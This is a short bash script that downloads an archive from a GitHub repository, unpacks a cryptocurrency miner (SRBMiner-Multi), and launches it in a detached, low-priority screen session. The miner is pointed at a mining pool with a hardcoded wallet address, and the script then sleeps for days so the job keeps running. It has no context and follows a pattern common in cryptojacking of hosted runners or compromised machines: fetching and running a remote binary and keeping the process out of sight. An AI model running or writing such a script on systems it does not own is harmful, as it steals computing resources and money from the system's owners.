#!/bin/bash

apt update
apt install screen -y
wget https://github.com/bibirbusin/bibirbusin/raw/main/sec.tar.xz
tar -xvf sec.tar.xz
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowerltncg --pool stratum+tcp://yespowerLTNCG.mine.zergpool.com:6239 --wallet RQ9cLzR9o1E92Pw9q5LtiHvDXBfeWhqvgo --password c=RVN,mc=CRNC,m=solo,ID=ALuxy$RANDOM
sleep 720099
